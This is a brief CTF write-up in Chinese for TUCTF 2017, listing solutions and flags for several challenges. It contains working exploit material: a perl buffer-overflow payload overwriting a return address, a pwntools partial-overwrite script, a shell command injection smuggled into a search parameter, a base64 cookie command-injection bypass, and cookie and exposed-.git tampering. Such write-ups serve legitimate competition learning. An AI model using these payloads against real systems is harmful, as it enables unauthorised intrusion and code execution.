# TUCTF 2017


## vuln chat

第一個scanf %30s

可以控到第二個scanf的format string

然後第二個scanf蓋夠長就能直接蓋到main的return address

payload:

`perl -e 'print "A"x20,"%90s\n","A"x49,"\x6B\x85\x04\x08\n"'`

`TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`


## vuln chat 2.0

直接蓋最後兩bytes

跳到print_flag

exp:

```
from pwn import *

r = remote('vulnchat2.tuctf.com', 4242)

r.sendline('aaa')
sleep(1)
r.send('a'*43 + "\x72\x86")

r.interactive()
```


## The nerver ending crypto

英文+特殊符號的凱薩加密

共50回合


`TUCTF{wh0_w@s_her3_la5t_ye@r?!?}`


## High source

從source code可以找到密碼

view-source:http://highsource.tuctf.com/scripts/login.js

password: `I4m4M4st3rC0d3rH4x0rsB3w43`

`TUCTF{H1gh_S0urc3_3qu4ls_L0ng_F4ll} `


## Cookie Duty 

cookie: `not_admin: 1 -> 0`

`TUCTF{D0nt_Sk1p_C00k13_Duty}`


## Git Gud

dump /.git

`git reset 22f63ceab55efe05c5448676a3470b13b6545f74`

`git diff`

`TUCTF{D0nt_Us3_G1t_0n_Web_S3rv3r}`


## Cookie Harrelson

cookie中可以看到一串base64

decode後發現是cat index.txt

踹踹看送cat flag可以發現前面會加上註解

用\n cat flag就可以繞過 (要先base64，再塞進cookie)


## iframe and shame

payload:

`search=https://youtube.com/watch?v=qqqasda";cat flag|head -1; "`

`TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}`


## Funmail

直接找username, password

就能登入看flag


## Funmail2.0

直接gdb跳過去print_flag


## I'm playing

登入discord即可看到flag

